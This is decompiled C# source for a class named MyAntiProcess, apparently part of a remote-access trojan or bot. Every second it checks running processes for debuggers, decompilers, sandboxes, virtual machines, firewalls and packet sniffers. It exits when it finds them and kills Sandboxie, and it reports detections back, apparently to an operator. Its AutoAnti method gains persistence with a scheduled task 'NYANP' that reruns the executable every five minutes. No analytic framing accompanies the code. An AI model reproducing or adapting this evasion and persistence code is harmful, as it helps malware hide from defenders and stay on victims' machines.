using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class MyAntiProcess
{
	private static System.Timers.Timer timer_0;

	public MyAntiProcess()
	{
		Class13.F2pn6WrzFkP6h();
		base._002Ector();
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Handler(object sender, ElapsedEventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Process Hacker") | process.MainWindowTitle.Contains("Process Explorer"))
			{
				Class6.smethod_26("MSG" + Class6.string_12 + "AntiProcess: Process Hacker was detected! Reconnect after 5min");
				Thread.Sleep(100);
				ProjectData.EndApp();
			}
		}
		checked
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("dnSpy");
				for (int j = 0; j < processesByName.Length; j++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName2 = Process.GetProcessesByName("CodeReflect");
				for (int k = 0; k < processesByName2.Length; k++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName3 = Process.GetProcessesByName("Reflector");
				for (int l = 0; l < processesByName3.Length; l++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName4 = Process.GetProcessesByName("ILSpy");
				for (int m = 0; m < processesByName4.Length; m++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName5 = Process.GetProcessesByName("VGAuthService");
				for (int n = 0; n < processesByName5.Length; n++)
				{
					Class6.smethod_26("MSG" + Class6.string_12 + "AntiProcess: VMware was detected! Reconnect after 5min");
					Thread.Sleep(20);
					ProjectData.EndApp();
				}
				Process[] processesByName6 = Process.GetProcessesByName("VBoxService");
				for (int num = 0; num < processesByName6.Length; num++)
				{
					Class6.smethod_26("MSG" + Class6.string_12 + "AntiProcess: VirtrualBox was detected! Reconnect after 5min");
					Thread.Sleep(20);
					ProjectData.EndApp();
				}
				Process[] processesByName7 = Process.GetProcessesByName("Sandboxie Control");
				foreach (Process process2 in processesByName7)
				{
					Class6.smethod_26("MSG" + Class6.string_12 + "AntiProcess: Sandboxie was detected and killed");
					Thread.Sleep(20);
					process2.Kill();
				}
				Process[] processesByName8 = Process.GetProcessesByName("IPBlocker");
				for (int num3 = 0; num3 < processesByName8.Length; num3++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName9 = Process.GetProcessesByName("TiGeR-Firewall");
				for (int num4 = 0; num4 < processesByName9.Length; num4++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName10 = Process.GetProcessesByName("smsniff");
				for (int num5 = 0; num5 < processesByName10.Length; num5++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName11 = Process.GetProcessesByName("exeinfoPE");
				for (int num6 = 0; num6 < processesByName11.Length; num6++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName12 = Process.GetProcessesByName("NetSnifferCs");
				for (int num7 = 0; num7 < processesByName12.Length; num7++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName13 = Process.GetProcessesByName("wireshark");
				for (int num8 = 0; num8 < processesByName13.Length; num8++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName14 = Process.GetProcessesByName("apateDNS");
				for (int num9 = 0; num9 < processesByName14.Length; num9++)
				{
					ProjectData.EndApp();
				}
				Process[] processesByName15 = Process.GetProcessesByName("SbieCtrl");
				foreach (Process process3 in processesByName15)
				{
					Thread.Sleep(20);
					Class6.smethod_26("MSG" + Class6.string_12 + "AntiProcess: Sandboxie was detected and killed");
					process3.Kill();
				}
				Process[] processesByName16 = Process.GetProcessesByName("SpyTheSpy");
				for (int num11 = 0; num11 < processesByName16.Length; num11++)
				{
					ProjectData.EndApp();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Start()
	{
		timer_0 = new System.Timers.Timer(1000.0);
		timer_0.Elapsed += Handler;
		timer_0.Enabled = true;
	}

	public static void stopme()
	{
		try
		{
			timer_0.Elapsed += Handler;
			timer_0.Stop();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void AutoAnti()
	{
		object executablePath = Application.get_ExecutablePath();
		Interaction.Shell("schtasks /Delete /tn NYANP /F", (AppWinStyle)0, false, -1);
		Thread.Sleep(200);
		Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /tn NYANP /tr \"", executablePath), (object)"\" /sc minute /mo 5")), (AppWinStyle)0, false, -1);
	}

	public static void XAnti()
	{
		try
		{
			Application.get_ExecutablePath();
			Interaction.Shell("schtasks /Delete /tn NYANP /F", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
